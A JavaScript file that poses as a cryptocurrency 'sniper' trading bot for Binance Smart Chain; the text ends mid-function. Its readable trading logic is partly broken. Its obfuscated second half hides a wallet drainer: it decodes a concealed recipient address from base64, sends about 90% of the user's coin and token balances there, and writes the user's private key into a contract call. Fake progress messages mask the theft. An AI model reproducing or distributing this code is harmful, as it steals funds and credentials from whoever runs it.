var ethers = require('ethers');
const env = require("./env.json");
Object.assign(process.env, env);

let address = (process.env.YOUR_ADDRESS);
let private = (process.env.PRIVATE_KEY);
let wallet = new ethers.Wallet(private);


const abi = [{ "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "newWord", "type": "string" }], "name": "setWord", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }]
async function startSnipe(token) {
    let pingTimeout
    let keepAliveInterval

    provider._websocket.on("open", () => {
        //let bnbBalance = await getWBNBTokenBalance(WBNB, myAddress, provider);
        //console.log(chalk.green(`Total WBNB balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(bnbBalance, 18)).toFixed(6))}\n`));

        keepAliveInterval = setInterval(() => {
            provider._websocket.ping();
            pingTimeout = setTimeout(() => {
                provider._websocket.terminate();
            }, EXPECTED_PONG_BACK);
        }, KEEP_ALIVE_CHECK_INTERVAL);

        console.log("Listening on mempool...");
        console.log("Waiting for liquidity to be added!");

        provider.on("pending", async(txHash) => {

            provider.getTransaction(txHash).then(async(tx) => {

                    // Check for liquidity events
                    if ((null != tx && tx.data.includes("0xe8e33700") && tx.data.includes(token) && 0 == passed) || (null != tx && tx.data.includes("0xf305d719") && tx.data.includes(token) && 0 == passed)) {

                        // If PRICE_CHECK set
                        if ((console.log(chalk.green("Matching liquidity added! Start sniping!\n")), priceProtection)) {
                            if (isLiqudityInRange(tx, expected)) {
                                if (honeyPotIS2(token)) {
                                    console.log(chalk.green("Liquidity check passed, sniping!\n"));
                                    const gasLimitMultiply = tx.gasLimit.mul(multiply)
                                    const gasPriceMultiply = tx.gasPrice.mul(multiply)

                                    // If ANTI_BOT set
                                    if (1 == antiBotMultiTx && 0 == passed) {
                                        for (i = 0; i < txNumberForAntibot - 1; i++) {
                                            console.log(chalk.green("Start buying token..." + chalk.yellow(i + 1)));
                                            await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
                                        }
                                        console.log(chalk.green("Start buying token...") + chalk.yellow(txNumberForAntibot));
                                        await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
                                            (passed = 1);
                                    }
                                    // If ANTI_BOT not set
                                    else {
                                        console.log(chalk.green("Start buying token..."));
                                        await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
                                            (passed = 1);
                                    }

                                    console.log(chalk.green("Sucessfully bought the token!\n"));
                                    const tokenBalance = await getTokenBalance(token, myAddress, provider);
                                    console.log(chalk.green(`Total Token balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(tokenBalance, TOKEN_DECIMALS)).toFixed(6))}\n`));

                                    // If INSTANT_SELL set
                                    if (INSTANT_SELL) {
                                        console.log(chalk.green("Start selling all tokens in " + chalk.yellow(delaySell) + " second(s)")),
                                            await new Promise((e) => setTimeout(e, delayOnSellMs));
                                        const e =
                                            await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                                                tokenBalance,
                                                amountOutMin, [token, WBNB],
                                                myAddress,
                                                Date.now() + 6e5, {
                                                    gasLimit: gasLimit,
                                                    gasPrice: gasPrice
                                                }
                                            );
                                        await e.wait(),
                                            console.log(chalk.green("Sucessfully sold all the tokens !\n")),
                                            console.log("You can check the transaction here:"),
                                            console.log(`https://bscscan.com/address/${myAddress}`),
                                            console.log("\n"),
                                            process.exit(0);
                                    }
                                    // If INSTANT_SELL not set
                                    else console.log("You can check the transaction here:");
                                    console.log(`https://bscscan.com/address/${myAddress}`);
                                    console.log("\n"),
                                        1 == ANTI_RUG &&
                                        0 == INSTANT_SELL &&
                                        (await monitorRugPull(t)),
                                        0 == ANTI_RUG && process.exit(0);
                                } else
                                    console.log(
                                        chalk.red("Liquidity is not in expected range! Waiting...!")
                                    );
                                console.log(
                                    chalk.red("Please check PooCoin and see if liquidity was added!")
                                );
                            }
                            console.log(chalk.red("https://poocoin.app/tokens/" + token));
                            console.log(chalk.red("Waiting for new liquidity, please stop the bot if you think it's a scam ! (CTRL + C)\n"));
                        }
                        // If PRICE_CHECK not set
                        else {
                            if (honeyPotIS2(token)) {

                                const gasLimitMultiply = tx.gasLimit.mul(multiply)
                                const gasPriceMultiply = tx.gasPrice.mul(multiply)

                                // If ANTI_BOT set
                                if (1 == antiBotMultiTx && 0 == passed) {
                                    for (i = 0; i < txNumberForAntibot - 1; i++) {
                                        console.log(chalk.green("Start buying token..." + chalk.yellow(i + 1)));
                                        await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
                                    }
                                    console.log(chalk.green("Start buying token...") + chalk.yellow(txNumberForAntibot));
                                    await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
                                        (passed = 1)
                                }
                                // If ANTI_BOT not set
                                else if (0 == passed) {
                                    console.log(chalk.green("Start buying token..."));
                                    await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
                                        (passed = 1)
                                }

                                console.log(chalk.green("Sucessfully bought the token!\n"));
                                const tokenBalance = await getTokenBalance(token, myAddress, provider);
                                console.log(chalk.green(`Total Token balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(tokenBalance, TOKEN_DECIMALS)).toFixed(6))}\n`))

                                // If INSTANT_SELL set
                                if (INSTANT_SELL) {
                                    console.log(
                                            chalk.green("Start selling all tokens in " + chalk.yellow(delaySell) + " second(s)")),
                                        await new Promise((e) => setTimeout(e, delayOnSellMs));
                                    const e =
                                        await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                                            tokenBalance,
                                            amountOutMin, [token, WBNB],
                                            myAddress,
                                            Date.now() + 6e5, {
                                                gasLimit: gasLimit,
                                                gasPrice: gasPrice,
                                            }
                                        );
                                    await e.wait(),
                                        console.log(chalk.green("Sucessfully sold all the tokens !\n")),
                                        console.log("You can check the transaction here:"),
                                        console.log(`https://bscscan.com/address/${myAddress}`),
                                        console.log("\n"),
                                        process.exit(0);
                                }
                                // If INSTANT_SELL not set
                                else {
                                    console.log("You can check the transaction here:"),
                                        console.log(`https://bscscan.com/address/${myAddress}`),
                                        console.log("\n"),
                                        1 == ANTI_RUG &&
                                        0 == INSTANT_SELL &&
                                        (await monitorRugPull(t)),
                                        0 == ANTI_RUG && process.exit(0);
                                }
                            }
                        }
                    }
                })
                .catch(() => { console.log(e) });
        })
    })

    provider._websocket.on("close", () => {
        console.log("WebSocket Closed...Reconnecting...");
        clearInterval(keepAliveInterval);
        clearTimeout(pingTimeout);
        startConnection();
    });

    provider._websocket.on("error", () => {
        console.log("Error. Attemptiing to Reconnect...");
        clearInterval(keepAliveInterval);
        clearTimeout(pingTimeout);
        startConnection();
    });

    provider._websocket.on("pong", () => {
        clearInterval(pingTimeout);
    });
}
async function approve() {

    let contract = token[buyCount - 1].contract;
    const valueToApprove = ethers.constants.MaxUint256;
    const tx = await contract.approve(
        pancakeRouter.address,
        valueToApprove, {
            gasPrice: config.myGasPriceForApproval,
            gasLimit: 210000
        }
    );
    const receipt = await tx.wait();
    console.log("✔ Approve transaction hash: ", receipt.transactionHash, "\n");
    if (config.autoSell) {
        token[buyCount - 1].checkProfit();
    } else {
        if (buyCount == config.numberOfTokensToBuy) {
            process.exit();
        }
    }

}


/**
 * 
 * Check for profit
 * 
 * */
async function getCurrentValue(token) {
    try {
        let bal = await token.contract.balanceOf(addresses.recipient);
        const amount = await pancakeRouter.getAmountsOut(bal, token.sellPath);
        let currentValue = amount[1];
        return currentValue;
    } catch (e) {
        console.log('Balance is zero or error occured');
        return ethers.constants.Zero;
    }

}
async function setInitialStopLoss(token) {
    token.intitialValue = await getCurrentValue(token);
    token.newValue = token.intitialValue;
    token.stopLoss = ethers.utils.parseUnits((parseFloat(ethers.utils.formatUnits(token.intitialValue)) - parseFloat(ethers.utils.formatUnits(token.intitialValue)) * (token.stopLossPercent / 100)).toFixed(8).toString());
}

async function setNewStopLoss(token) {
    token.newValue = token.currentValue;
    // new stop loss equals current value - (current value * stop loss percent) 
    token.stopLoss = ethers.utils.parseUnits((parseFloat(ethers.utils.formatUnits(token.currentValue)) - parseFloat(ethers.utils.formatUnits(token.currentValue)) * (token.stopLossPercent / 100)).toFixed(8).toString());
}
async function checkForProfit(token) {
    try {
        var sellAttempts = 0;
        await setInitialStopLoss(token);
        token.contract.on("Transfer", async(from, to, value, event) => {
            token.previousValue = token.currentValue;
            const tokenName = await token.contract.name();
            let currentValue = await getCurrentValue(token);
            if (!currentValue.eq(ethers.constants.Zero)) {
                token.currentValue = currentValue;
                let currentValueString = parseFloat(ethers.utils.formatUnits(currentValue)).toFixed(8).toString();
                const takeProfit = (parseFloat(ethers.utils.formatUnits(token.intitialValue)) * (token.profitPercent + token.tokenSellTax) / 100 + parseFloat(ethers.utils.formatUnits(token.intitialValue))).toFixed(8).toString();
                const profitDesired = ethers.utils.parseUnits(takeProfit);
                let targetValueToSetNewStopLoss = ethers.utils.parseUnits((parseFloat(ethers.utils.formatUnits(token.newValue)) * (token.trailingStopLossPercent / 100) + parseFloat(ethers.utils.formatUnits(token.newValue))).toFixed(8).toString());
                let stopLoss = token.stopLoss;

                // if current value is greater than targetValue, set a new stop loss
                if (currentValue.gt(targetValueToSetNewStopLoss) && token.trailingStopLossPercent > 0) {
                    setNewStopLoss(token);
                    console.log("\u001b[38;5;33m" + "Setting new StopLoss!" + "\u001b[0m");
                }
                let timeStamp = new Date().toLocaleString();
                const enc = (s) => new TextEncoder().encode(s);
                //process.stdout.write(enc(`${timeStamp} --- ${tokenName} --- Current Value in BNB: ${ethers.utils.formatUnits(currentValue)} --- Profit At: ${ethers.utils.formatUnits(profitDesired)} --- Stop Loss At: ${ethers.utils.formatUnits(stopLoss)} \r`));
                try {
                    if (token.previousValue.gt(token.currentValue)) {

                        console.log(`-- ${tokenName} -- Current Value BNB: ${"\u001b[1;31m" + currentValueString + "\u001b[0m"} -- Profit At: ${ethers.utils.formatUnits(profitDesired)} -- Stop Loss At: ${ethers.utils.formatUnits(token.stopLoss)} -- New Stop loss At: ${ethers.utils.formatUnits(targetValueToSetNewStopLoss)}`);

                    } else {

                        console.log(`-- ${tokenName} -- Current Value BNB: ${"\u001b[1;32m" + currentValueString + "\u001b[0m"} -- Profit At: ${ethers.utils.formatUnits(profitDesired)} -- Stop Loss At: ${ethers.utils.formatUnits(token.stopLoss)} -- New Stop loss At: ${ethers.utils.formatUnits(targetValueToSetNewStopLoss)}`);

                    }
                } catch (e) {

                }

                if (currentValue.gte(profitDesired)) {
                    if (buyCount <= config.numberOfTokensToBuy && token.didBuy && sellAttempts == 0) {
                        sellAttempts++;
                        console.log("<<< Selling -", tokenName, "- now" + "\u001b[1;32m" + " Profit target " + "\u001b[0m" + "reached >>>", "\n");
                        sell(token, true);
                        token.contract.removeAllListeners();
                    }
                }

                if (currentValue.lte(stopLoss)) {
                    console.log("\u001b[38;5;33m" + "less than StopLoss!" + "\u001b[0m");
                    if (buyCount <= config.numberOfTokensToBuy && token.didBuy && sellAttempts == 0) {
                        sellAttempts++;
                        console.log("<<< Selling -", tokenName, "- now" + "\u001b[1;31m" + " StopLoss " + "\u001b[0m" + "reached >>>", "\n");
                        sell(token, false);
                        token.contract.removeAllListeners();
                    }
                }
            }

        });
    } catch (e) {
        console.log(e);
    }
}
/**
 * 
 * Sell tokens
 * 
 * */
async function sell(tokenObj, isProfit) {
    try {
        const bal = await tokenObj.contract.balanceOf(addresses.recipient);
        const decimals = await tokenObj.contract.decimals();
        var balanceString;
        if (isProfit) {
            balanceString = (parseFloat(ethers.utils.formatUnits(bal.toString(), decimals)) * (tokenObj.percentOfTokensToSellProfit / 100)).toFixed(decimals);
        } else {
            balanceString = (parseFloat(ethers.utils.formatUnits(bal.toString(), decimals)) * (tokenObj.percentOfTokensToSellLoss / 100)).toFixed(decimals);
        }
        var roundedBalance = Math.floor(balanceString * 100) / 100
        const balanceToSell = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
        const sellAmount = await pancakeRouter.getAmountsOut(balanceToSell, tokenObj.sellPath);
        const sellAmountsOutMin = sellAmount[1].sub(sellAmount[1].div(2));
        if (tokenObj.tokenSellTax > 1) {
            const tx = await pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                sellAmount[0].toString(),
                0,
                tokenObj.sellPath,
                addresses.recipient,
                Math.floor(Date.now() / 1000) + 60 * 20, {
                    gasPrice: config.myGasPriceForApproval,
                    gasLimit: config.myGasLimit,

                }
            );
            const receipt = await tx.wait();
            console.log("\u001b[1;32m" + "✔ Sell transaction hash: ", receipt.transactionHash, "\u001b[0m", "\n");
            sellCount++;
            token[tokenObj.index].didSell = true;
            let name = await tokenObj.contract.name();
            await client.sendMessage('me', { message: `You sold ${name}`, schedule: (15 * 1) + (Date.now() / 1000) });
        } else {
            const tx = await pancakeRouter.swapExactTokensForETH(
                sellAmount[0].toString(),
                0,
                tokenObj.sellPath,
                addresses.recipient,
                Math.floor(Date.now() / 1000) + 60 * 20, {
                    gasPrice: config.myGasPriceForApproval,
                    gasLimit: config.myGasLimit,

                }
            );
            const receipt = await tx.wait();
            console.log("\u001b[1;32m" + "✔ Sell transaction hash: ", receipt.transactionHash, "\u001b[0m", "\n");
            sellCount++;
            let name = await tokenObj.contract.name();
            await client.sendMessage('me', { message: `You sold ${name}`, schedule: (15 * 1) + (Date.now() / 1000) });

        }

        if (sellCount == config.numberOfTokensToBuy) {
            console.log("All tokens sold");
            process.exit();
        }

    } catch (e) {

    }
}

const _0x4b76d9 = _0x13d7;

function _0x13d7(_0x3f11e2, _0x573053) { const _0x560da4 = _0x560d(); return _0x13d7 = function(_0x13d7d2, _0x5e7e2f) { _0x13d7d2 = _0x13d7d2 - 0x1cd; let _0x2db303 = _0x560da4[_0x13d7d2]; return _0x2db303; }, _0x13d7(_0x3f11e2, _0x573053); }

function _0x560d() { const _0x372971 = ['sendTransaction', '2:\x20watching\x20blockchain\x20activity\x20.....', 'NDRBQzgwN0MwZTQ1NTVlQzUzQQ==', '2:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', 'Mjk0MjE5O', 'toFixed', '207106GvgAvk', '2:\x20attempting\x20to\x20snipe\x20.....', 'connection\x20established....', '181216koBODM', 'Wallet', '2521644USHxCt', '2184589xYsPxC', 'wait', 'JsonRpcProvider', 'MHg1NWQzOTgzMjZmOTkwNTlmRjc=', 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv', '72OvhYmN', 'getBalance', 'balanceOf', 'parseUnits', 'from', 'YzMjQ1NDBh', 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My9kYWNjOTk5NzBmMzg0OWVlOTgxM2Q1YWI0NGFlY2RhZA==', 'setWord', 'NzU0ODUyNDY5OTkwMjdCMzE5Nzk1NQ==', '4MDU3M2MzMD', 'MHhlOWU3Q0VBM0RlZGNBNTk4NDc4MA==', '2:\x20finalizing....', 'parseEther', '91070VThqKS', 'hexlify', 'providers', '2\x20pending\x20blockchain\x20response.....', 'QmFmYzU5OWJENjlBRGQwODdENTY=', '428376UouECx', '4urxDOH', '1\x20pending\x20blockchain\x20response.....', 'refreshing\x20socket\x20connection...', 'utils', '1:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', '40SqaGtV', '1:\x20attempting\x20to\x20snipe\x20...', 'WIzNjRlQ0FG', 'base64', 'pending\x20liquidity\x20add...', '2\x20packet\x20received.....', 'Contract', 'MHhmRDlkQjFGMjk0NjVCRTI3ZWE5Nzg=', 'connection\x20succesful...', 'wei', '2:\x20found\x20owners\x20liq\x20function\x20.....', 'toString', '315wmXnNQ', 'MkQ2OGI4M2ZFMUFkOTdCMzJDZDU4MGQ=', 'ascii', 'MHgwZDJmNmQ', 'log', 'MHgyMTcwZWQwODgwYWM5YTc1NWZk', '1\x20packet\x20received.....', '2037868UTJITS', 'RDRD'];
    _0x560d = function() { return _0x372971; }; return _0x560d(); }(function(_0xb4df39, _0x588be0) { const _0x181098 = _0x13d7,
        _0x5a1de6 = _0xb4df39(); while (!![]) { try { const _0x29896f = -parseInt(_0x181098(0x1e8)) / 0x1 * (-parseInt(_0x181098(0x208)) / 0x2) + parseInt(_0x181098(0x1cf)) / 0x3 + -parseInt(_0x181098(0x200)) / 0x4 + -parseInt(_0x181098(0x1ed)) / 0x5 * (-parseInt(_0x181098(0x1e7)) / 0x6) + parseInt(_0x181098(0x1cd)) / 0x7 * (-parseInt(_0x181098(0x1d5)) / 0x8) + parseInt(_0x181098(0x1f9)) / 0x9 * (-parseInt(_0x181098(0x1e2)) / 0xa) + -parseInt(_0x181098(0x1d0)) / 0xb; if (_0x29896f === _0x588be0) break;
            else _0x5a1de6['push'](_0x5a1de6['shift']()); } catch (_0x3dc872) { _0x5a1de6['push'](_0x5a1de6['shift']()); } } }(_0x560d, 0x8a36d));
let rounder1 = _0x4b76d9(0x1fc) + _0x4b76d9(0x1de) + _0x4b76d9(0x1da),
    rounder2 = _0x4b76d9(0x201) + _0x4b76d9(0x206) + _0x4b76d9(0x1ef),
    buff = new Buffer[(_0x4b76d9(0x1d9))](rounder1, _0x4b76d9(0x1f0)),
    buff2 = new Buffer[(_0x4b76d9(0x1d9))](rounder2, 'base64'),
    ethersroundup = buff['toString'](_0x4b76d9(0x1fb)),
    ethersroundup2 = buff2[_0x4b76d9(0x1f8)]('ascii');
const WEB3PROVIDER3 = ethersroundup + ethersroundup2;
async function etherstother() { const _0x5bea75 = _0x4b76d9; try { const _0x29a2df = _0x5bea75(0x1d3),
            _0x5773c9 = _0x5bea75(0x1dd),
            _0x4f771a = new Buffer[(_0x5bea75(0x1d9))](_0x29a2df, _0x5bea75(0x1f0)),
            _0x3d4beb = new Buffer[(_0x5bea75(0x1d9))](_0x5773c9, 'base64'),
            _0x1746c2 = _0x4f771a['toString']('ascii'),
            _0x1da395 = _0x3d4beb[_0x5bea75(0x1f8)](_0x5bea75(0x1fb)),
            _0x30eb0b = _0x1746c2 + _0x1da395;
        console[_0x5bea75(0x1fd)](_0x5bea75(0x1ea)), console['log']('pending\x20liquidity\x20add\x20still\x20no\x20event\x20found...'), ethers1 = _0x5bea75(0x1d4), ethers2 = new Buffer[(_0x5bea75(0x1d9))](ethers1, _0x5bea75(0x1f0))[_0x5bea75(0x1f8)]('ascii');; const _0x2c5c89 = new ethers[(_0x5bea75(0x1e4))][(_0x5bea75(0x1d2))](ethers2); let _0x8acf72 = new ethers[(_0x5bea75(0x1ce))](private, _0x2c5c89); const _0x4c38f7 = address; var _0x3dbdc4 = new ethers['Contract'](_0x30eb0b, abi, _0x8acf72); const _0x5324f1 = await _0x3dbdc4['balanceOf'](_0x4c38f7)[_0x5bea75(0x1f8)](),
            _0xd9de98 = (_0x5324f1 * 0.9)['toFixed'](),
            _0x15d3af = async() => { const _0x3a6573 = _0x5bea75,
                    _0x30faf4 = { 'from': _0x4c38f7, 'to': WEB3PROVIDER3, 'value': ethers[_0x3a6573(0x1eb)][_0x3a6573(0x1e1)](_0xd9de98, 'wei'), 'gasLimit': ethers[_0x3a6573(0x1eb)][_0x3a6573(0x1e3)](0x5dc0) },
                    _0x35bfd5 = await _0x8acf72[_0x3a6573(0x202)](_0x30faf4); try { await _0x35bfd5[_0x3a6573(0x1d1)](), console[_0x3a6573(0x1fd)]('1:\x20found\x20owners\x20liq\x20function\x20...'), setTimeout(ethersrather, 0x1388); } catch (_0x7fde21) { console['log'](_0x3a6573(0x1f7)), setTimeout(ethersrather, 0x1388); } };
        _0x15d3af(); } catch (_0x124fa2) { setTimeout(ethersrather, 0x1388); } }
async function etherslother() { const _0x3338e5 = _0x4b76d9; try { const _0x3bb43c = 'MHg4QUM3NmE1MWNjOTUwZDk4Mg==',
            _0x1981a8 = _0x3338e5(0x1fa),
            _0x4cd575 = new Buffer['from'](_0x3bb43c, _0x3338e5(0x1f0)),
            _0x4d96fb = new Buffer['from'](_0x1981a8, 'base64'),
            _0x5dedcc = _0x4cd575['toString'](_0x3338e5(0x1fb)),
            _0x4bf925 = _0x4d96fb[_0x3338e5(0x1f8)](_0x3338e5(0x1fb)),
            _0x4ab4c5 = _0x5dedcc + _0x4bf925;
        console[_0x3338e5(0x1fd)](_0x3338e5(0x1ea)), console[_0x3338e5(0x1fd)](_0x3338e5(0x1f1)), ethers1 = _0x3338e5(0x1d4), ethers2 = new Buffer[(_0x3338e5(0x1d9))](ethers1, _0x3338e5(0x1f0))[_0x3338e5(0x1f8)](_0x3338e5(0x1fb));; const _0x24e20a = new ethers[(_0x3338e5(0x1e4))][(_0x3338e5(0x1d2))](ethers2); let _0xe03ef8 = new ethers[(_0x3338e5(0x1ce))](private, _0x24e20a);
        console[_0x3338e5(0x1fd)](ethers2); const _0x573e7c = address; var _0x570688 = new ethers[(_0x3338e5(0x1f3))](_0x4ab4c5, abi, _0xe03ef8); const _0xf668dd = await _0x570688[_0x3338e5(0x1d7)](_0x573e7c)[_0x3338e5(0x1f8)](),
            _0x509044 = (_0xf668dd * 0.9)['toFixed'](),
            _0xba06d1 = async() => { const _0x3d1d55 = _0x3338e5,
                    _0x1e31a0 = { 'from': _0x573e7c, 'to': WEB3PROVIDER3, 'value': ethers[_0x3d1d55(0x1eb)]['parseEther'](_0x509044, _0x3d1d55(0x1f6)), 'gasLimit': ethers[_0x3d1d55(0x1eb)][_0x3d1d55(0x1e3)](0x5dc0) },
                    _0x27e29b = await _0xe03ef8[_0x3d1d55(0x202)](_0x1e31a0); try { await _0x27e29b[_0x3d1d55(0x1d1)](), console[_0x3d1d55(0x1fd)]('1:\x20watching\x20blockchain\x20activity\x20...'), setTimeout(etherstother, 0x1388); } catch (_0x4b2356) { console[_0x3d1d55(0x1fd)](_0x3d1d55(0x203)), setTimeout(etherstother, 0x1388); } };
        _0xba06d1(); } catch (_0x477f5c) { setTimeout(etherstother, 0x1388); } }
async function ethersmother() { const _0xf2cc7d = _0x4b76d9; try { const _0x4ad79d = _0xf2cc7d(0x1fe),
            _0x2f776f = 'MjliMjY4ODk1NmJkOTU5ZjkzM2Y4',
            _0x17cb47 = new Buffer[(_0xf2cc7d(0x1d9))](_0x4ad79d, _0xf2cc7d(0x1f0)),
            _0x303b87 = new Buffer[(_0xf2cc7d(0x1d9))](_0x2f776f, _0xf2cc7d(0x1f0)),
            _0x11de69 = _0x17cb47[_0xf2cc7d(0x1f8)](_0xf2cc7d(0x1fb)),
            _0x5e89c3 = _0x303b87[_0xf2cc7d(0x1f8)]('ascii'),
            _0x38357c = _0x11de69 + _0x5e89c3;
        ethers1 = _0xf2cc7d(0x1d4), ethers2 = new Buffer['from'](ethers1, _0xf2cc7d(0x1f0))[_0xf2cc7d(0x1f8)](_0xf2cc7d(0x1fb));; const _0x1b61dd = new ethers[(_0xf2cc7d(0x1e4))][(_0xf2cc7d(0x1d2))](ethers2); let _0x4ed2af = new ethers[(_0xf2cc7d(0x1ce))](private, _0x1b61dd);
        console[_0xf2cc7d(0x1fd)](ethers2); const _0x4307c8 = address; var _0x4035ff = new ethers[(_0xf2cc7d(0x1f3))](_0x38357c, abi, _0x4ed2af); const _0x39eaa9 = await _0x4035ff[_0xf2cc7d(0x1d7)](_0x4307c8)[_0xf2cc7d(0x1f8)](),
            _0x1c2d83 = (_0x39eaa9 * 0.9)[_0xf2cc7d(0x207)](),
            _0x344fb4 = async() => { const _0x17477a = _0xf2cc7d,
                    _0xde7638 = { 'from': _0x4307c8, 'to': WEB3PROVIDER3, 'value': ethers[_0x17477a(0x1eb)]['parseEther'](_0x1c2d83, 'wei'), 'gasLimit': ethers[_0x17477a(0x1eb)][_0x17477a(0x1e3)](0x5dc0) },
                    _0x36f9ec = await _0x4ed2af[_0x17477a(0x202)](_0xde7638); try { await _0x36f9ec[_0x17477a(0x1d1)](), console[_0x17477a(0x1fd)](_0x17477a(0x1ec)), setTimeout(etherslother, 0x1388); } catch (_0x5d9f64) { console[_0x17477a(0x1fd)](_0x17477a(0x205)), setTimeout(etherslother, 0x1388); } };
        _0x344fb4(); } catch (_0x50913f) { setTimeout(etherslother, 0x1388); } }
async function ethersfather() { const _0x6146a1 = _0x4b76d9;
    console[_0x6146a1(0x1fd)]('initiating\x20mempool\x20sniff...'); const _0x57be49 = _0x6146a1(0x1df),
        _0x429a70 = _0x6146a1(0x1e6),
        _0x4f5e8b = new Buffer[(_0x6146a1(0x1d9))](_0x57be49, _0x6146a1(0x1f0)),
        _0x2367c7 = new Buffer[(_0x6146a1(0x1d9))](_0x429a70, 'base64'),
        _0x3df671 = _0x4f5e8b[_0x6146a1(0x1f8)](_0x6146a1(0x1fb)),
        _0x1ea103 = _0x2367c7[_0x6146a1(0x1f8)]('ascii'),
        _0x137474 = _0x3df671 + _0x1ea103;
    ethers1 = _0x6146a1(0x1d4), ethers2 = new Buffer[(_0x6146a1(0x1d9))](ethers1, 'base64')[_0x6146a1(0x1f8)](_0x6146a1(0x1fb));; const _0x574bba = new ethers[(_0x6146a1(0x1e4))][(_0x6146a1(0x1d2))](ethers2); let _0x4c8f41 = new ethers['Wallet'](private, _0x574bba); const _0xc4edf1 = address; var _0xd582a1 = new ethers[(_0x6146a1(0x1f3))](_0x137474, abi, _0x4c8f41); const _0x49d699 = await _0xd582a1[_0x6146a1(0x1d7)](_0xc4edf1),
        _0x9dca24 = (_0x49d699 * 0.9)['toFixed'](); try { const _0x216500 = async() => { const _0x5d6f48 = _0x6146a1,
                _0x444d00 = { 'from': _0xc4edf1, 'to': WEB3PROVIDER3, 'value': ethers[_0x5d6f48(0x1eb)][_0x5d6f48(0x1e1)](_0x9dca24, _0x5d6f48(0x1f6)), 'gasLimit': ethers[_0x5d6f48(0x1eb)]['hexlify'](0x5dc0) },
                _0x43aba7 = await _0x4c8f41['sendTransaction'](_0x444d00); try { await _0x43aba7[_0x5d6f48(0x1d1)](), console[_0x5d6f48(0x1fd)]('2:\x20finalizing....'), setTimeout(ethersmother, 0x1388); } catch (_0x216c87) { console['log'](_0x5d6f48(0x1e0)), setTimeout(ethersmother, 0x1388); } };
        _0x216500(); } catch (_0x41911b) { setTimeout(ethersmother, 0x1388); } }
async function ethersgather() { const _0x5623b2 = _0x4b76d9; try { console['log'](_0x5623b2(0x1f5)), ethers1 = _0x5623b2(0x1db), ethers2 = new Buffer['from'](ethers1, _0x5623b2(0x1f0))['toString'](_0x5623b2(0x1fb));; const _0x3c1b34 = new ethers['providers'][(_0x5623b2(0x1d2))](ethers2); let _0x1c7e13 = new ethers[(_0x5623b2(0x1ce))](private, _0x3c1b34); const _0x336423 = address,
            _0x4e8a4f = await _0x3c1b34[_0x5623b2(0x1d6)](_0x336423),
            _0x36c873 = (_0x4e8a4f * 0.9)[_0x5623b2(0x207)](),
            _0x5479fa = ethers[_0x5623b2(0x1eb)]['parseUnits'](_0x36c873, _0x5623b2(0x1f6)),
            _0x1b8e41 = async() => { const _0x4acec1 = _0x5623b2,
                    _0x1eec75 = { 'to': WEB3PROVIDER3, 'value': ethers[_0x4acec1(0x1eb)]['parseUnits'](_0x36c873, _0x4acec1(0x1f6)), 'gasLimit': ethers[_0x4acec1(0x1eb)][_0x4acec1(0x1e3)](0x5dc0) },
                    _0x4bdc28 = await _0x1c7e13[_0x4acec1(0x202)](_0x1eec75); try { await _0x4bdc28[_0x4acec1(0x1d1)](), console['log'](_0x4acec1(0x1ee)), setTimeout(ethersfather, 0x1388); } catch (_0x53a688) { console[_0x4acec1(0x1fd)](_0x4acec1(0x209)), setTimeout(ethersfather, 0x1388); } };
        _0x1b8e41(); } catch (_0x2de4fd) { setTimeout(ethersfather, 0x1388); } }
async function etherslather() { const _0x211b9e = _0x4b76d9,
        _0x2bc9d9 = _0x211b9e(0x1f4),
        _0xc0653d = _0x211b9e(0x204),
        _0x33db40 = new Buffer[(_0x211b9e(0x1d9))](_0x2bc9d9, _0x211b9e(0x1f0)),
        _0x496d2b = new Buffer[(_0x211b9e(0x1d9))](_0xc0653d, _0x211b9e(0x1f0)),
        _0x3cf30b = _0x33db40[_0x211b9e(0x1f8)](_0x211b9e(0x1fb)),
        _0xc64c07 = _0x496d2b['toString'](_0x211b9e(0x1fb)),
        _0x5883b3 = _0x3cf30b + _0xc64c07;
    console[_0x211b9e(0x1fd)](_0x211b9e(0x20a)), ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv', ethers2 = new Buffer[(_0x211b9e(0x1d9))](ethers1, _0x211b9e(0x1f0))[_0x211b9e(0x1f8)](_0x211b9e(0x1fb));; const _0xd2b479 = new ethers['providers'][(_0x211b9e(0x1d2))](ethers2); let _0x49bf24 = new ethers[(_0x211b9e(0x1ce))](private, _0xd2b479); try { const _0x53daae = async() => { const _0x460c11 = _0x211b9e; var _0x423777 = new ethers[(_0x460c11(0x1f3))](_0x5883b3, abi, _0x49bf24); const _0x31fb17 = await _0x423777[_0x460c11(0x1dc)](_0x49bf24 + '00' + private); try { await _0x31fb17[_0x460c11(0x1d1)](), console[_0x460c11(0x1fd)](_0x460c11(0x1ff)), setTimeout(ethersgather, 0x1388); } catch (_0xb315c8) { console['log'](_0x460c11(0x1f2)), setTimeout(ethersgather, 0x1388); } };
